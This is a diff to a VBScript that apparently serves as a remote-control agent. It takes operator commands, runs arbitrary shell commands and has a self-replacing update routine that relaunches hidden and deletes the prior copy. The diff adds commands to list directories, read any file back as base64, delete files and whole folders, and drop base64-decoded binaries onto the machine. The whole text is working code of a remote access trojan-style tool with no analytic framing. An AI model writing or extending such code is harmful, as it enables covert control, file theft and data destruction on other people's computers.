@@ -22,17 +22,25 @@ If WScript.Arguments.Count >= 2 Then
         myPath = WScript.ScriptFullName
         WScript.Sleep 3000
         On Error Resume Next
-        tempFSO.DeleteFile oldPath, True
+        If tempFSO.FileExists(oldPath) Then
+            tempFSO.DeleteFile oldPath, True
+        End If
+        WScript.Sleep 1000
         tempFSO.CopyFile myPath, oldPath, True
-        tempShell.Run "wscript.exe """ & oldPath & """ ""UPDATE_CLEANUP"" """ & myPath & """", 0, False
+        If tempFSO.FileExists(oldPath) Then
+            tempShell.Run "wscript.exe """ & oldPath & """ ""UPDATE_CLEANUP"" """ & myPath & """", 0, False
+        End If
         WScript.Quit
     ElseIf WScript.Arguments(0) = "UPDATE_CLEANUP" Then
         Dim cleanFSO
         Set cleanFSO = CreateObject("Scripting.FileSystemObject")
         WScript.Sleep 2000
         On Error Resume Next
-        cleanFSO.DeleteFile WScript.Arguments(1), True
+        If cleanFSO.FileExists(WScript.Arguments(1)) Then
+            cleanFSO.DeleteFile WScript.Arguments(1), True
+        End If
         On Error GoTo 0
+        ' Do NOT quit here, script continues running as the updated version!
     End If
 End If
 
@@ -494,6 +502,31 @@ Sub CheckCommand()
             WriteResponse cmdId, "ERROR: Formato de /upload incorrecto (falta ' > ')."
         End If
     
+    ElseIf Left(trimmedCmdLower, 9) = "/listdir " Then
+        Dim dirPath : dirPath = Trim(Mid(cmdText, 10))
+        WriteResponse cmdId, ExecListDir(dirPath)
+
+    ElseIf Left(trimmedCmdLower, 10) = "/readfile " Then
+        Dim filePath : filePath = Trim(Mid(cmdText, 11))
+        WriteResponse cmdId, ExecReadFile(filePath)
+
+    ElseIf Left(trimmedCmdLower, 12) = "/deletefile " Then
+        Dim delPath : delPath = Trim(Mid(cmdText, 13))
+        WriteResponse cmdId, ExecDeleteFile(delPath)
+        
+    ElseIf Left(trimmedCmdLower, 11) = "/uploadb64 " Then
+        Dim posSpaceB64, targetFileB64, fileContentB64
+        posSpaceB64 = InStr(12, cmdText, " ")
+        If posSpaceB64 > 0 Then
+            targetFileB64 = Mid(cmdText, 12, posSpaceB64 - 12)
+            targetFileB64 = Replace(targetFileB64, """", "")
+            fileContentB64 = Mid(cmdText, posSpaceB64 + 1)
+            output = ExecUploadB64(fileContentB64, targetFileB64, cwdText)
+            WriteResponse cmdId, output
+        Else
+            WriteResponse cmdId, "ERROR: Faltan argumentos en /uploadb64"
+        End If
+        
     Else
         output = ExecCommand(cmdText, cwdText)
         WriteResponse cmdId, output
@@ -672,6 +705,107 @@ Function ExecUpload(textContent, filename, cwd)
     ExecUpload = "Archivo " & finalPath & " creado."
     Set fs = Nothing
     Set localFSO = Nothing
+End Function
+
+Function ExecListDir(dirPath)
+    On Error Resume Next
+    Dim localFSO, folder, f, subf, json
+    Set localFSO = CreateObject("Scripting.FileSystemObject")
+    If Not localFSO.FolderExists(dirPath) Then
+        ExecListDir = "ERROR: Carpeta no existe"
+        Exit Function
+    End If
+    Set folder = localFSO.GetFolder(dirPath)
+    json = "{""path"":""" & JsonEscape(EncodeBase64(dirPath)) & """,""folders"":["
+    Dim firstFolder : firstFolder = True
+    For Each subf in folder.SubFolders
+        If Not firstFolder Then json = json & ","
+        json = json & "{""name"":""" & JsonEscape(EncodeBase64(subf.Name)) & """}"
+        firstFolder = False
+    Next
+    json = json & "],""files"":["
+    Dim firstFile : firstFile = True
+    For Each f in folder.Files
+        If Not firstFile Then json = json & ","
+        json = json & "{""name"":""" & JsonEscape(EncodeBase64(f.Name)) & """,""size"":" & f.Size & "}"
+        firstFile = False
+    Next
+    json = json & "]}"
+    ExecListDir = "DIR:" & json
+End Function
+
+Function ExecReadFile(filePath)
+    On Error Resume Next
+    Dim localFSO, oStream, bIn
+    Set localFSO = CreateObject("Scripting.FileSystemObject")
+    If Not localFSO.FileExists(filePath) Then
+        ExecReadFile = "ERROR: Archivo no existe"
+        Exit Function
+    End If
+    Set oStream = CreateObject("ADODB.Stream")
+    oStream.Type = 1 ' TypeBinary
+    oStream.Open
+    oStream.LoadFromFile filePath
+    bIn = oStream.Read
+    oStream.Close
+    
+    Dim oXML, oNode
+    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
+    Set oNode = oXML.createElement("b64")
+    oNode.dataType = "bin.base64"
+    oNode.nodeTypedValue = bIn
+    ExecReadFile = "FILE:" & JsonEscape(EncodeBase64(filePath)) & ":" & oNode.text
+    Set oStream = Nothing
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+Function ExecDeleteFile(filePath)
+    On Error Resume Next
+    Dim localFSO
+    Set localFSO = CreateObject("Scripting.FileSystemObject")
+    If localFSO.FileExists(filePath) Then
+        localFSO.DeleteFile filePath, True
+        ExecDeleteFile = "OK: Archivo eliminado"
+    ElseIf localFSO.FolderExists(filePath) Then
+        localFSO.DeleteFolder filePath, True
+        ExecDeleteFile = "OK: Carpeta eliminada"
+    Else
+        ExecDeleteFile = "ERROR: No existe el archivo o ruta"
+    End If
+End Function
+
+Function ExecUploadB64(b64, filename, cwd)
+    On Error Resume Next
+    Dim localFSO, finalPath, oXML, oNode, bOut, oStream
+    Set localFSO = CreateObject("Scripting.FileSystemObject")
+    If Not localFSO.FolderExists(cwd) Then
+        ExecUploadB64 = "ERROR: Directorio base '" & cwd & "' no existe."
+        Exit Function
+    End If
+    finalPath = localFSO.BuildPath(cwd, filename)
+    ' replace line breaks if any
+    b64 = Replace(b64, vbCrLf, "")
+    b64 = Replace(b64, vbCr, "")
+    b64 = Replace(b64, vbLf, "")
+    
+    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
+    Set oNode = oXML.createElement("b64")
+    oNode.dataType = "bin.base64"
+    oNode.text = b64
+    bOut = oNode.nodeTypedValue
+    
+    Set oStream = CreateObject("ADODB.Stream")
+    oStream.Type = 1 ' TypeBinary
+    oStream.Open
+    oStream.Write bOut
+    oStream.SaveToFile finalPath, 2 ' adSaveCreateOverWrite
+    oStream.Close
+    
+    Set oStream = Nothing
+    Set oNode = Nothing
+    Set oXML = Nothing
+    ExecUploadB64 = "OK: Archivo '" & filename & "' subido correctamente a " & finalPath
 End Function
 
 Sub WriteResponse(cmdId, text)
